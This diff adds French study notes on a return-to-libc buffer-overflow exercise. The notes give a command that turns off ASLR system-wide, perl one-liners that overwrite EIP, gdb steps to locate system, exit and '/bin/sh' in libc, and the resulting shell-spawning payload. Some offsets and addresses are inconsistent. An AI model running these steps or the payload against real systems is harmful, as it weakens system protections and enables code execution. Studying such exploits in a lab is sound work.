@@ -1,0 +1,43 @@
+désactiver aslr
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+Si 2, ASLR activé
+
+cat /proc/sys/kernel/randomize_va_space
+
+
+écrire deadbeef sur eip
+run $(perl -e 'print "A"x20 . "\xef\xbe\xad\xde"')
+
+
+trouver les adresses des fonctions de la libc
+p system
+p exit
+
+
+trouver /bin/sh
+	méthode 1
+		info proc map : voir ou le chemin de la libc
+		strings -a -t x /lib/i386-linux-gnu/libc-2.27.so | grep "/bin/sh"
+	méthode 2
+		find "/bin/sh" (dans gdb-peda)
+		
+		
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7dfbd00 <system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xf7dee680 <exit>
+libc : 0xf7f46b62 ("/bin/sh")
+
+
+
+payload = A*16 + address of system() + return address for system() + address of "/bin/sh"
+
+run "$(perl -e 'print "A"x20 . "\x00\xbd\xdf\xf7" . "\x80\xe6\xde\xf7" . "\x62\x6b\xf4\xf7"')"
+
+libc : 0xf7f46b62 ("/bin/sh")
+$3 = {<text variable, no debug info>} 0xf7dfbd00 <system>
+$4 = {<text variable, no debug info>} 0xf7dee680 <exit>
+
+
+system : $1 = {int (const char *)} 0xf7dcc800 <__libc_system>
